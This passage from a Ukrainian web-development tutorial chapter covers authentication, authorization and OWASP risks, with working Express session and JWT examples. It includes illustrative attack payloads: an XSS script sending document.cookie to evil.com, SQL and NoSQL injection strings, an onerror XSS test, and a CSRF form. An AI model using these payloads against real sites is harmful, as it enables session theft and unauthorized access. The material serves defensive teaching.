+  <p>Не пишіть OAuth-клієнта вручну для продакшену. У Node-світі це <b>Auth.js</b> (колишній NextAuth) для Next.js, <b>Lucia</b>-підхід (бібліотека oslo/arctic) для тих, хто хоче контролю, або <code>openid-client</code> — сертифікована реалізація OIDC. Вивчіть <code>.well-known/openid-configuration</code> — це JSON, де провайдер публікує всі свої endpoints і публічні ключі (JWKS) для перевірки <code>id_token</code>. Читання цього документа — найкращий спосіб зрозуміти, що OIDC насправді стандартизований і Google, Microsoft, Auth0 і Keycloak працюють однаково.</p>
+</div>
+
+<h2 id="s7">7. Ролі та права: RBAC і ABAC</h2>
+<p>Автентифікували — тепер вирішуємо, що можна. Дві популярні моделі:</p>
+<ul>
+  <li><b>RBAC (Role-Based Access Control)</b> — у користувача є роль (<code>admin</code>, <code>editor</code>, <code>viewer</code>), у ролі — набір дозволів (<code>posts:delete</code>, <code>users:invite</code>). Просто, зрозуміло, покриває 80% застосунків.</li>
+  <li><b>ABAC (Attribute-Based Access Control)</b> — рішення приймається за атрибутами: користувача (відділ, вік), ресурсу (власник, статус «чернетка»), контексту (час, IP). Приклад правила: «редагувати пост може автор, поки пост не опубліковано, або будь-який editor». Гнучкіше, але складніше пояснити й протестувати.</li>
+</ul>
+<pre><code class="language-js">// authz.js — проста RBAC + трішки ABAC
+const PERMISSIONS = {
+  viewer: ["posts:read"],
+  editor: ["posts:read", "posts:create", "posts:update"],
+  admin:  ["posts:read", "posts:create", "posts:update", "posts:delete", "users:manage"],
+};
+
+export function can(user, action, resource) {
+  const byRole = PERMISSIONS[user.role]?.includes(action);
+  // ABAC-виняток: автор завжди може редагувати/видаляти власну чернетку
+  const isOwnerDraft = resource?.authorId === user.id &amp;&amp; resource?.status === "draft";
+  return byRole || (isOwnerDraft &amp;&amp; ["posts:update", "posts:delete"].includes(action));
+}
+
+// middleware для Express
+export const authorize = (action, loadResource) => async (req, res, next) => {
+  const resource = loadResource ? await loadResource(req) : null;
+  if (!req.user) return res.status(401).json({ error: "not authenticated" });
+  if (!can(req.user, action, resource)) return res.status(403).json({ error: "forbidden" });
+  req.resource = resource; // щоб не завантажувати вдруге
+  next();
+};</code></pre>
+<p>Головне правило авторизації: <b>перевіряйте на сервері, при кожному запиті, для кожного ресурсу</b>. Сховати кнопку «Видалити» у React — це UX, а не безпека.</p>
+
+<h2 id="s8">8. OWASP Top 10: найпоширеніші атаки</h2>
+<p><b>OWASP</b> (Open Worldwide Application Security Project) — спільнота, що публікує список десяти найкритичніших ризиків для вебзастосунків. Розберемо ті, з якими ви стикнетеся першими.</p>
+
+<h3>8.1 SQL Injection</h3>
+<p>Якщо ви склеюєте SQL-запит із рядків користувача, користувач може «дописати» свій SQL:</p>
+<pre><code class="language-js">// ❌ НЕБЕЗПЕЧНО: email = "' OR 1=1 --" перетворить запит на "вибрати всіх"
+const rows = await db.query(`SELECT * FROM users WHERE email = '${email}'`);
+
+// ✅ ПРАВИЛЬНО: параметризований запит — драйвер сам екранує значення
+const rows = await db.query("SELECT * FROM users WHERE email = $1", [email]);
+
+// ✅ ORM/Query builder (Drizzle, Prisma, Kysely) роблять це за вас
+const user = await db.select().from(users).where(eq(users.email, email));</code></pre>
+<p>Ті самі правила для NoSQL: не передавайте об'єкт із тіла запиту прямо у <code>find()</code> — <code>{ "password": { "$ne": "" } }</code> обійде перевірку в MongoDB.</p>
+
+<h3>8.2 XSS (Cross-Site Scripting)</h3>
+<p>Зловмисник змушує ваш сайт виконати <i>його</i> JavaScript у браузері <i>іншого</i> користувача. Найчастіше — через збережений і неекранований контент: коментар <code>&lt;script&gt;fetch('https://evil.com?c='+document.cookie)&lt;/script&gt;</code>.</p>
+
+<figure>
+  <svg viewBox="0 0 760 260" role="img" aria-label="Схема stored XSS атаки">
+    <defs><marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z"/></marker></defs>
+    <rect x="10" y="30" width="150" height="70" rx="14" class="red"/>
+    <text x="85" y="58" text-anchor="middle" class="bold">Зловмисник</text>
+    <text x="85" y="80" text-anchor="middle" class="small">пише коментар</text>
+    <path d="M160 65 L300 65" class="arrow"/>
+    <text x="230" y="55" text-anchor="middle" class="mono small">&lt;script&gt;...&lt;/script&gt;</text>
+    <rect x="300" y="30" width="160" height="70" rx="14" class="green"/>
+    <text x="380" y="58" text-anchor="middle" class="bold">Сервер + БД</text>
+    <text x="380" y="80" text-anchor="middle" class="small">зберіг як є</text>
+    <path d="M460 65 L600 65" class="arrow"/>
+    <text x="530" y="55" text-anchor="middle" class="small">рендер сторінки</text>
+    <rect x="600" y="30" width="150" height="70" rx="14" class="blue"/>
+    <text x="675" y="58" text-anchor="middle" class="bold">Жертва</text>
+    <text x="675" y="80" text-anchor="middle" class="small">скрипт виконався</text>
+    <path d="M675 100 L675 160" class="arrow"/>
+    <text x="700" y="135" class="mono small">document.cookie</text>
+    <path d="M600 190 L160 190" class="arrow"/>
+    <text x="380" y="182" text-anchor="middle" class="mono small">fetch("https://evil.com?c=sid=a8f3")</text>
+    <rect x="600" y="160" width="150" height="60" rx="14" class="blue"/>
+    <text x="675" y="196" text-anchor="middle" class="small">браузер жертви</text>
+    <rect x="10" y="160" width="150" height="60" rx="14" class="red"/>
+    <text x="85" y="196" text-anchor="middle" class="small">отримав сесію</text>
+    <text x="380" y="245" text-anchor="middle" class="muted">Захист: екранування виводу (React робить це сам), HttpOnly, Content-Security-Policy</text>
+  </svg>
+  <figcaption>Stored XSS: шкідливий код зберігається один раз і виконується у кожного, хто відкриє сторінку.</figcaption>
+</figure>
+
+<p>Захист:</p>
+<ul>
+  <li><b>Екрануйте вивід</b>. React, Vue, Svelte та шаблонізатори роблять це за замовчуванням. Небезпечні виходи: <code>dangerouslySetInnerHTML</code>, <code>innerHTML</code>, <code>v-html</code>, <code>href="javascript:..."</code>.</li>
+  <li><b>Санітизуйте HTML</b>, якщо мусите його приймати (DOMPurify).</li>
+  <li><b>Content-Security-Policy (CSP)</b> — заголовок, який каже браузеру, звідки можна вантажити скрипти: <code>Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'</code>. Навіть якщо скрипт потрапив у HTML, браузер його не виконає.</li>
+  <li><code>HttpOnly</code> на cookie — щоб украдений скрипт не мав чого красти.</li>
+</ul>
+
+<h3>8.3 CSRF (Cross-Site Request Forgery)</h3>
+<p>Ви залогінені в банку (cookie є). Відкриваєте сайт зловмисника, де є прихована форма, яка автоматично надсилає <code>POST bank.com/transfer</code>. Браузер, як і належить, додає cookie банку — і переказ проходить від вашого імені. Ключова властивість: зловмисник не бачить відповіді, але йому й не треба — дія вже виконана.</p>
+
+<figure>
+  <svg viewBox="0 0 760 280" role="img" aria-label="Схема CSRF атаки і захисту">
+    <defs><marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z"/></marker></defs>
+    <rect x="10" y="20" width="200" height="70" rx="14" class="red"/>
+    <text x="110" y="48" text-anchor="middle" class="bold">evil.com</text>
+    <text x="110" y="70" text-anchor="middle" class="mono small">&lt;form action=bank.com/transfer&gt;</text>
+    <path d="M210 55 L300 55" class="arrow"/>
+    <text x="255" y="45" text-anchor="middle" class="small">auto-submit</text>
+    <rect x="300" y="20" width="180" height="70" rx="14" class="blue"/>
+    <text x="390" y="48" text-anchor="middle" class="bold">Браузер жертви</text>
+    <text x="390" y="70" text-anchor="middle" class="small">додає cookie bank.com</text>
+    <path d="M480 55 L570 55" class="arrow"/>
+    <text x="525" y="45" text-anchor="middle" class="mono small">POST + Cookie</text>
+    <rect x="570" y="20" width="180" height="70" rx="14" class="green"/>
+    <text x="660" y="48" text-anchor="middle" class="bold">bank.com</text>
+    <text x="660" y="70" text-anchor="middle" class="small">«cookie є → виконую»</text>
+
+    <text x="20" y="135" class="bold">Захист (будь-який із трьох, краще два):</text>
+    <rect x="20" y="150" width="220" height="100" rx="14" class="accent"/>
+    <text x="130" y="175" text-anchor="middle" class="bold small">SameSite=Lax/Strict</text>
+    <text x="130" y="197" text-anchor="middle" class="small">браузер не додає cookie</text>
+    <text x="130" y="215" text-anchor="middle" class="small">до POST з чужого сайту</text>
+    <text x="130" y="235" text-anchor="middle" class="muted">дефолт у Chrome з 2020</text>
+    <rect x="265" y="150" width="220" height="100" rx="14" class="accent"/>
+    <text x="375" y="175" text-anchor="middle" class="bold small">CSRF-токен</text>
+    <text x="375" y="197" text-anchor="middle" class="small">секрет у формі/заголовку,</text>
+    <text x="375" y="215" text-anchor="middle" class="small">evil.com його не знає</text>
+    <text x="375" y="235" text-anchor="middle" class="muted">synchronizer / double-submit</text>
+    <rect x="510" y="150" width="220" height="100" rx="14" class="accent"/>
+    <text x="620" y="175" text-anchor="middle" class="bold small">Перевірка Origin/Referer</text>
+    <text x="620" y="197" text-anchor="middle" class="small">Origin: evil.com ≠ bank.com</text>
+    <text x="620" y="215" text-anchor="middle" class="small">→ відхилити</text>
+    <text x="620" y="235" text-anchor="middle" class="muted">браузер додає Origin сам</text>
+  </svg>
+  <figcaption>CSRF працює лише через автоматичні cookie. Токен у заголовку <code>Authorization</code> до CSRF невразливий — але вразливий до XSS.</figcaption>
+</figure>
+
+<h3>8.4 IDOR (Insecure Direct Object Reference)</h3>
+<p>Запит <code>GET /api/invoices/1042</code> повертає рахунок. Що буде на <code>/api/invoices/1043</code>? Якщо чужий рахунок — це IDOR, найпоширеніша форма Broken Access Control. Захист: у <i>кожному</i> запиті фільтруйте за власником: <code>WHERE id = $1 AND user_id = $2</code>. Використання UUID замість послідовних чисел ускладнює перебір, але не замінює перевірку.</p>
+
+<h3>8.5 Security Misconfiguration</h3>
+<p>Дебаг-режим у продакшені, стандартні паролі адмінки, відкритий <code>/.env</code> через статику, докладні stack trace у відповідях, S3-бакет «публічний для всіх», CORS <code>*</code> з credentials. Ліки — чеклісти й автоматизація: сканери на кшталт <code>npm audit</code>, OWASP ZAP, налаштування середовищ як код.</p>
+
+<div class="box why">
+  <div class="title">Чому «просто екранувати» — не повна відповідь</div>
+  <p>Безпека — це шари (defense in depth). Екранування зупиняє XSS, але розробник колись забуде. CSP зупинить те, що пройшло. HttpOnly не дасть украсти сесію, якщо CSP обійшли. SameSite захистить від CSRF, якщо токен забули. Кожен шар — не «замість», а «на додачу». Порушник має пройти всі, ви — помилитися в одному.</p>
+</div>
+
+<h2 id="s9">9. Периметр: rate limiting, HTTPS, helmet, CORS, секрети</h2>
+<h3>Rate limiting і brute force</h3>
+<p>Якщо <code>/login</code> можна викликати без обмежень, зловмисник перебере тисячі паролів за хвилину. Обмежуйте: 5 спроб на email за 15 хвилин, 100 запитів на IP за хвилину, експоненційна затримка після невдач. Для розподілених систем лічильники живуть у Redis.</p>
+<pre><code class="language-js">import rateLimit from "express-rate-limit";
+
+export const loginLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,      // вікно 15 хвилин
+  limit: 5,                       // 5 спроб на вікно
+  keyGenerator: (req) => req.body?.email ?? req.ip, // рахуємо на email, а не лише на IP
+  standardHeaders: "draft-7",     // RateLimit-* заголовки у відповіді
+  message: { error: "Забагато спроб. Спробуйте через 15 хвилин." },
+});
+app.post("/login", loginLimiter, loginHandler);</code></pre>
+
+<h3>HTTPS всюди</h3>
+<p>Без TLS усе — паролі, cookie, токени — летить відкритим текстом через кожен роутер на шляху. Сьогодні сертифікати безкоштовні (Let's Encrypt), а платформи (Vercel, Fly, Railway, Cloudflare) дають HTTPS автоматично. Додайте <code>Strict-Transport-Security</code> (HSTS), щоб браузер ніколи більше не ходив по HTTP.</p>
+
+<h3>helmet: заголовки одним рядком</h3>
+<pre><code class="language-js">import helmet from "helmet";
+app.use(helmet({
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'"],                 // жодних inline-скриптів і чужих CDN без потреби
+      imgSrc: ["'self'", "data:", "https://cdn.example.com"],
+      frameAncestors: ["'none'"],            // захист від clickjacking
+    },
+  },
+}));
+// helmet також вмикає: X-Content-Type-Options: nosniff, HSTS, Referrer-Policy, ховає X-Powered-By</code></pre>
+
+<h3>CORS правильно</h3>
+<p><b>CORS (Cross-Origin Resource Sharing)</b> — не захист сервера, а <i>дозвіл</i> браузеру читати відповідь з іншого origin. Типова помилка — <code>Access-Control-Allow-Origin: *</code> разом із cookie: браузер такого не дозволяє, і розробник додає <code>Allow-Credentials: true</code> з віддзеркаленням будь-якого Origin — тепер будь-який сайт може робити запити від імені користувача і читати відповіді.</p>
+<pre><code class="language-js">import cors from "cors";
+const allowed = new Set(["https://app.example.com", "http://localhost:3000"]);
+app.use(cors({
+  origin: (origin, cb) => cb(null, !origin || allowed.has(origin)), // тільки явний білий список
+  credentials: true,                                                 // дозволяємо cookie
+  methods: ["GET", "POST", "PATCH", "DELETE"],
+}));</code></pre>
+
+<h3>Секрети та .env</h3>
+<ul>
+  <li>Секрети живуть у змінних середовища, не в коді. <code>.env</code> — у <code>.gitignore</code>, у репозиторії — <code>.env.example</code> з порожніми значеннями.</li>
+  <li>Різні секрети для dev / staging / prod. Витік дев-ключа не має відкривати продакшен.</li>
+  <li><b>Ротація (rotation)</b>: секрети періодично міняють. Для JWT це означає підтримку двох ключів одночасно (старий — лише для перевірки, новий — для підпису) — механізм <code>kid</code> у header і JWKS.</li>
+  <li>Якщо секрет випадково потрапив у git — вважайте його скомпрометованим і міняйте негайно, навіть якщо «одразу видалили коміт». Боти сканують GitHub за секунди.</li>
+  <li>Для команд — менеджери секретів: Doppler, 1Password Secrets, AWS Secrets Manager, HashiCorp Vault.</li>
+</ul>
+
+<h2 id="s10">10. 2FA, TOTP і passkeys</h2>
+<p>Пароль — «те, що ти знаєш». <b>Двофакторна автентифікація (2FA)</b> додає «те, що ти маєш» (телефон, ключ) або «те, чим ти є» (відбиток). Найпоширеніший другий фактор — <b>TOTP (Time-based One-Time Password)</b>: Google Authenticator, Authy. Механізм простий: сервер і телефон поділяють секрет (QR-код при налаштуванні), і кожні 30 секунд обидва обчислюють <code>HMAC(secret, floor(now/30))</code> → 6 цифр. Інтернет телефону не потрібен.</p>
+<pre><code class="language-js">import { authenticator } from "otplib";
+
+// Налаштування: генеруємо секрет, показуємо QR
+const secret = authenticator.generateSecret();
+const otpauthUrl = authenticator.keyuri("olya@example.com", "MyApp", secret); // → у QR-код
+// секрет зберігаємо в БД (краще зашифрованим), поки не підтверджено — статус "pending"
+
+// Перевірка при логіні (після пароля)
+const ok = authenticator.check(req.body.code, user.totpSecret); // допуск ±1 вікно</code></pre>
+<p>SMS-коди — слабкий другий фактор (SIM-swap атаки), але кращий за нічого.</p>
+<p><b>Passkeys / WebAuthn</b> — майбутнє, яке вже настало. Замість пароля пристрій генерує пару ключів; приватний ніколи не покидає пристрій (захищений Face ID / відбитком), публічний зберігає сервер. При логіні сервер надсилає виклик (challenge), пристрій підписує його приватним ключем. Фішинг неможливий: ключ прив'язаний до домену, і на <code>g00gle.com</code> він просто не спрацює. У Node реалізується через <code>@simplewebauthn/server</code>.</p>
+
+<h2 id="s11">11. Практика: логін на Express — сесії та JWT</h2>
+<h3>Варіант A: сесії + cookie + bcrypt</h3>
+<pre><code class="language-js">// server-session.js  —  npm i express express-session connect-redis ioredis bcrypt helmet express-rate-limit
+import express from "express";
+import session from "express-session";
+import { RedisStore } from "connect-redis";
+import Redis from "ioredis";
+import bcrypt from "bcrypt";
+import helmet from "helmet";
+import rateLimit from "express-rate-limit";
+import crypto from "node:crypto";
+
+const app = express();
+app.use(helmet());
+app.use(express.json());
+app.set("trust proxy", 1); // за nginx/Cloudflare, щоб Secure cookie і req.ip працювали
+
+// «база» користувачів — у реальності таблиця users
+const users = new Map(); // email → { id, email, passwordHash }
+
+const redis = new Redis(process.env.REDIS_URL);
+app.use(session({
+  store: new RedisStore({ client: redis, prefix: "sess:" }),
+  secret: process.env.SESSION_SECRET,     // підписує cookie, ≥32 випадкових байти
+  name: "sid",                            // не «connect.sid» — не розкриваємо стек
+  resave: false,
+  saveUninitialized: false,               // не створюємо сесію для анонімів
+  cookie: {
+    httpOnly: true,
+    secure: process.env.NODE_ENV === "production",
+    sameSite: "lax",
+    maxAge: 1000 * 60 * 60 * 24 * 7,      // 7 днів
+  },
+}));
+
+const loginLimiter = rateLimit({ windowMs: 15 * 60_000, limit: 5, keyGenerator: r => r.body?.email ?? r.ip });
+
+app.post("/register", async (req, res) => {
+  const { email, password } = req.body ?? {};
+  if (typeof email !== "string" || typeof password !== "string" || password.length &lt; 8) {
+    return res.status(400).json({ error: "email і пароль (≥8 символів) обов'язкові" });
+  }
+  if (users.has(email)) return res.status(409).json({ error: "email зайнятий" });
+  const passwordHash = await bcrypt.hash(password, 12);
+  const user = { id: crypto.randomUUID(), email, passwordHash };
+  users.set(email, user);
+  res.status(201).json({ id: user.id, email });
+});
+
+app.post("/login", loginLimiter, async (req, res) => {
+  const { email, password } = req.body ?? {};
+  const user = users.get(email);
+  // Захист від перебору email: порівнюємо навіть якщо користувача нема, щоб час відповіді не видавав існування
+  const hash = user?.passwordHash ?? "$2b$12$invalidinvalidinvalidinvalidinvalidinvalidinvalidinvalid.";
+  const ok = await bcrypt.compare(password ?? "", hash);
+  if (!user || !ok) return res.status(401).json({ error: "невірний email або пароль" }); // одна фраза на обидва випадки
+
+  // Session fixation: після логіну міняємо id сесії
+  req.session.regenerate((err) => {
+    if (err) return res.status(500).end();
+    req.session.userId = user.id;
+    res.json({ id: user.id, email: user.email });
+  });
+});
+
+// middleware автентифікації
+function requireAuth(req, res, next) {
+  if (!req.session.userId) return res.status(401).json({ error: "not authenticated" });
+  next();
+}
+
+app.get("/me", requireAuth, (req, res) => {
+  const user = [...users.values()].find(u => u.id === req.session.userId);
+  res.json({ id: user.id, email: user.email });
+});
+
+app.post("/logout", requireAuth, (req, res) => {
+  req.session.destroy(() => {
+    res.clearCookie("sid");
+    res.status(204).end();
+  });
+});
+
+app.listen(3000, () => console.log("http://localhost:3000"));</code></pre>
+
+<h3>Варіант B: JWT access + refresh</h3>
+<pre><code class="language-js">// server-jwt.js  —  npm i express jsonwebtoken bcrypt cookie-parser helmet
+import express from "express";
+import jwt from "jsonwebtoken";
+import bcrypt from "bcrypt";
+import cookieParser from "cookie-parser";
+import helmet from "helmet";
+import crypto from "node:crypto";
+
+const app = express();
+app.use(helmet());
+app.use(express.json());
+app.use(cookieParser());
+
+const ACCESS_SECRET = process.env.JWT_ACCESS_SECRET;   // ≥ 32 байти, різні для access і refresh
+const REFRESH_SECRET = process.env.JWT_REFRESH_SECRET;
+const ACCESS_TTL = "15m";
+const REFRESH_TTL_SEC = 60 * 60 * 24 * 7;
+
+const users = new Map();          // email → { id, email, passwordHash }
+const refreshTokens = new Map();  // jti → { userId, expiresAt }  — у реальності таблиця в БД
+
+function issueTokens(user) {
+  const access = jwt.sign({ sub: user.id, role: "user" }, ACCESS_SECRET, { algorithm: "HS256", expiresIn: ACCESS_TTL });
+  const jti = crypto.randomUUID(); // ідентифікатор refresh-токена — щоб можна було відкликати
+  const refresh = jwt.sign({ sub: user.id, jti }, REFRESH_SECRET, { algorithm: "HS256", expiresIn: REFRESH_TTL_SEC });
+  refreshTokens.set(jti, { userId: user.id, expiresAt: Date.now() + REFRESH_TTL_SEC * 1000 });
+  return { access, refresh };
+}
+
+function setRefreshCookie(res, refresh) {
+  res.cookie("refresh", refresh, {
+    httpOnly: true, secure: process.env.NODE_ENV === "production", sameSite: "strict",
+    path: "/auth/refresh",              // cookie летить ТІЛЬКИ на цей шлях
+    maxAge: REFRESH_TTL_SEC * 1000,
+  });
+}
+
+app.post("/auth/register", async (req, res) => {
+  const { email, password } = req.body ?? {};
+  if (!email || !password || password.length &lt; 8) return res.status(400).json({ error: "bad input" });
+  if (users.has(email)) return res.status(409).json({ error: "email зайнятий" });
+  users.set(email, { id: crypto.randomUUID(), email, passwordHash: await bcrypt.hash(password, 12) });
+  res.status(201).end();
+});
+
+app.post("/auth/login", async (req, res) => {
+  const { email, password } = req.body ?? {};
+  const user = users.get(email);
+  if (!user || !(await bcrypt.compare(password ?? "", user.passwordHash))) {
+    return res.status(401).json({ error: "невірний email або пароль" });
+  }
+  const { access, refresh } = issueTokens(user);
+  setRefreshCookie(res, refresh);
+  res.json({ accessToken: access }); // клієнт тримає його в пам'яті
+});
+
+// Ротація refresh-токена: старий анулюємо, видаємо новий (виявляє крадіжку: повторне використання → відкликати все)
+app.post("/auth/refresh", (req, res) => {
+  const token = req.cookies.refresh;
+  if (!token) return res.status(401).end();
+  let payload;
+  try { payload = jwt.verify(token, REFRESH_SECRET, { algorithms: ["HS256"] }); }
+  catch { return res.status(401).json({ error: "invalid refresh" }); }
+
+  const record = refreshTokens.get(payload.jti);
+  if (!record) {
+    // токен валідний за підписом, але вже використаний → хтось його вкрав. Відкликаємо всі сесії користувача
+    for (const [jti, r] of refreshTokens) if (r.userId === payload.sub) refreshTokens.delete(jti);
+    return res.status(401).json({ error: "refresh reuse detected" });
+  }
+  refreshTokens.delete(payload.jti);
+  const user = [...users.values()].find(u => u.id === payload.sub);
+  const { access, refresh } = issueTokens(user);
+  setRefreshCookie(res, refresh);
+  res.json({ accessToken: access });
+});
+
+function requireAuth(req, res, next) {
+  const [scheme, token] = (req.headers.authorization ?? "").split(" ");
+  if (scheme !== "Bearer" || !token) return res.status(401).json({ error: "no token" });
+  try {
+    req.user = jwt.verify(token, ACCESS_SECRET, { algorithms: ["HS256"] }); // ЗАВЖДИ фіксуйте алгоритм
+    next();
+  } catch (e) {
+    res.status(401).json({ error: e.name === "TokenExpiredError" ? "token expired" : "invalid token" });
+  }
+}
+
+app.get("/me", requireAuth, (req, res) => res.json({ id: req.user.sub, role: req.user.role }));
+
+app.post("/auth/logout", (req, res) => {
+  const token = req.cookies.refresh;
+  try { const { jti } = jwt.verify(token, REFRESH_SECRET); refreshTokens.delete(jti); } catch {}
+  res.clearCookie("refresh", { path: "/auth/refresh" });
+  res.status(204).end();
+});
+
+app.listen(3000, () => console.log("http://localhost:3000"));</code></pre>
+
+<div class="box try">
+  <div class="title">Спробуй сам</div>
+  <ol>
+    <li>Запусти варіант A. Зареєструйся через <code>curl -c jar.txt -X POST localhost:3000/register -H 'content-type: application/json' -d '{"email":"a@b.c","password":"kotyk2024"}'</code>, залогінься з <code>-c jar.txt</code>, виклич <code>/me</code> з <code>-b jar.txt</code>. Подивись у Redis: <code>redis-cli KEYS 'sess:*'</code>.</li>
+    <li>Спробуй 6 разів залогінитися з неправильним паролем. Переконайся, що шоста спроба дає 429.</li>
+    <li>Запусти варіант B. Отримай access, зачекай 15 хвилин (або постав <code>ACCESS_TTL = "10s"</code>), переконайся, що <code>/me</code> дає 401, а <code>/auth/refresh</code> повертає новий токен.</li>
+    <li>Візьми access token і встав у <a href="https://jwt.io" target="_blank" rel="noopener">jwt.io</a>. Зміни <code>role</code> на <code>admin</code> у payload — і подивись, як підпис стає недійсним.</li>
+    <li>Спробуй викликати <code>/auth/refresh</code> двічі з тим самим старим cookie — переконайся, що друга спроба відкликає всі токени.</li>
+  </ol>
+</div>
+
+<div class="box try">
+  <div class="title">Спробуй сам: атакуй власний код</div>
+  <ol>
+    <li>Створи маршрут, що склеює SQL із рядка (навмисно, на SQLite у пам'яті). Введи <code>' OR 1=1 --</code> як email. Потім виправ через параметри.</li>
+    <li>Зроби сторінку коментарів без екранування і додай коментар із <code>&lt;img src=x onerror="alert(document.cookie)"&gt;</code>. Постав <code>HttpOnly</code> і подивись, що зміниться. Додай CSP і подивись помилку в консолі.</li>
+    <li>Зроби HTML-файл на іншому порту з формою, що POST-ить на твій <code>/logout</code>. Перевір із <code>SameSite=None</code> і з <code>Lax</code>.</li>
+    <li>Перевір свій старий пароль на <a href="https://haveibeenpwned.com/Passwords" target="_blank" rel="noopener">Have I Been Pwned</a> (сайт використовує k-анонімність — повний пароль не надсилається).</li>
+  </ol>
+</div>
+
+<h2>Перевір себе</h2>
+<div class="box quiz">
+  <div class="title">Питання</div>
+  <details><summary>1. Чим відрізняється 401 від 403?</summary><p>401 — сервер не знає, хто ви (не автентифіковані або токен недійсний). 403 — знає, але вам ця дія заборонена (авторизація не пройдена).</p></details>
+  <details><summary>2. Чому SHA-256 не підходить для паролів, а bcrypt підходить?</summary><p>SHA-256 надто швидкий — GPU перебирає мільярди варіантів за секунду. bcrypt/argon2 навмисно повільні з налаштовуваною вартістю і вбудованою сіллю, тому перебір стає економічно неможливим.</p></details>
+  <details><summary>3. Що лежить у cookie при сесійній автентифікації?</summary><p>Лише випадковий ідентифікатор сесії. Усі дані (userId, ролі) — у сховищі на сервері. Тому сесію можна миттєво відкликати.</p></details>
+  <details><summary>4. Чи зашифрований payload JWT?</summary><p>Ні. Він лише закодований у base64url — прочитати може будь-хто. Підпис гарантує цілісність (що ніхто не змінив), а не секретність.</p></details>
+  <details><summary>5. Навіщо refresh token, якщо є access token?</summary><p>Access короткоживучий і не відкликається; refresh довгоживучий, зберігається в базі і може бути відкликаний. Разом вони дають і масштабованість (перевірка без БД), і можливість «вийти з усіх пристроїв».</p></details>
+  <details><summary>6. Що захищає PKCE в OAuth?</summary><p>Від перехоплення authorization code: код можна обміняти на токен тільки маючи code_verifier, який ніколи не покидав застосунок. А параметр state захищає від CSRF на callback.</p></details>
+  <details><summary>7. Від чого захищає HttpOnly, а від чого — SameSite?</summary><p>HttpOnly — від крадіжки cookie через XSS (JS не бачить cookie). SameSite — від CSRF (браузер не додає cookie до запитів, ініційованих із чужого сайту).</p></details>
+  <details><summary>8. Чому CORS з Allow-Origin, що віддзеркалює будь-який Origin, разом із credentials — небезпечно?</summary><p>Будь-який сайт зможе робити запити з cookie користувача і читати відповіді — це фактично вимкнення захисту браузера. Origin треба перевіряти за білим списком.</p></details>
+</div>
+
+<h2>Що запам'ятати</h2>
+<ul class="checklist">
+  <li>Автентифікація — «хто ти» (401), авторизація — «що тобі можна» (403). Перевіряйте обидві на сервері при кожному запиті.</li>
+  <li>Паролі ніколи не зберігають — лише повільний солений хеш (bcrypt cost 12 або argon2id).</li>
+  <li>Сесія = випадковий id у cookie + запис на сервері. Cookie з <code>HttpOnly; Secure; SameSite=Lax</code>.</li>
+  <li>JWT = header.payload.signature; payload читається всіма; перевіряється без бази; не відкликається — тому короткий access + refresh у базі з ротацією.</li>
+  <li>Для «сайт + свій бекенд» — сесії простіші. JWT — для публічних API, мобільних клієнтів, мікросервісів.</li>
+  <li>«Увійти через Google» = OIDC поверх OAuth 2.0, потік Authorization Code + PKCE, після нього — своя сесія.</li>
+  <li>SQLi — параметризовані запити; XSS — екранування + CSP + HttpOnly; CSRF — SameSite + токен/Origin; IDOR — фільтр за власником.</li>
+  <li>Rate limiting на логін, HTTPS + HSTS, helmet, CORS за білим списком, секрети в env з ротацією.</li>
+  <li>2FA через TOTP — простий і надійний; passkeys — фішинг-стійке майбутнє.</li>
+</ul>
+
+<div class="box links">
+  <div class="title">Ресурси для поглиблення</div>
+  <ul>
+    <li><a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener">OWASP Top 10</a> — канонічний список ризиків; читайте опис кожного з прикладами.</li>
+    <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html" target="_blank" rel="noopener">OWASP Authentication Cheat Sheet</a> — конкретні рекомендації щодо логіну, повідомлень про помилки, блокувань.</li>
+    <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html" target="_blank" rel="noopener">OWASP Session Management Cheat Sheet</a> — довжина id, регенерація, час життя, атрибути cookie.</li>
+    <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html" target="_blank" rel="noopener">OWASP Password Storage Cheat Sheet</a> — актуальні параметри argon2id/bcrypt/scrypt.</li>
+    <li><a href="https://jwt.io/introduction" target="_blank" rel="noopener">jwt.io</a> — інтерактивний декодер і вступ у структуру JWT.</li>
+    <li><a href="https://auth0.com/docs/get-started/authentication-and-authorization-flow/which-oauth-2-0-flow-should-i-use" target="_blank" rel="noopener">Auth0: Which OAuth 2.0 flow should I use?</a> — дерево рішень для вибору потоку.</li>
+    <li><a href="https://oauth.net/2/" target="_blank" rel="noopener">oauth.net</a> — специфікації, PKCE, Security Best Current Practice.</li>
+    <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies" target="_blank" rel="noopener">MDN: Using HTTP cookies</a> — усі атрибути cookie з прикладами.</li>
+    <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank" rel="noopener">MDN: Content Security Policy</a> — як писати CSP і не зламати сайт.</li>
+    <li><a href="https://authjs.dev/" target="_blank" rel="noopener">Auth.js</a> — OAuth/OIDC для Next.js та інших фреймворків без болю.</li>
+    <li><a href="https://lucia-auth.com/" target="_blank" rel="noopener">Lucia</a> — навчальний ресурс «як реалізувати сесії самому правильно».</li>
+    <li><a href="https://webauthn.guide/" target="_blank" rel="noopener">webauthn.guide</a> — passkeys/WebAuthn з демо і поясненнями.</li>
+    <li><a href="https://haveibeenpwned.com/" target="_blank" rel="noopener">Have I Been Pwned</a> — база витоків; API для перевірки паролів при реєстрації.</li>
+  </ul>
+</div>
+
+<nav class="pager" id="pager"></nav>
+<footer>Fullstack для чайників · Розділ 07</footer>
+</main>
+</div>
+<script src="../assets/nav.js"></script>
+</body>
+</html>
